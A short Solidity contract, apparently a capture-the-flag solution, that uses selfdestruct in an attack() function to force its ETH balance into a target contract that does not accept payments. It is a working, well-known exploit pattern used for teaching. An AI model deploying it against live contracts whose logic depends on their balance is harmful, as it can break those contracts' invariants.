// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker2 {
    constructor() payable {
        // Contract can receive ETH on deployment
    }
    
    receive() external payable {
        // Allow contract to receive ETH
    }
    
    function attack(address target) public {
        // selfdestruct sends all contract balance to target
        selfdestruct(payable(target));
    }
}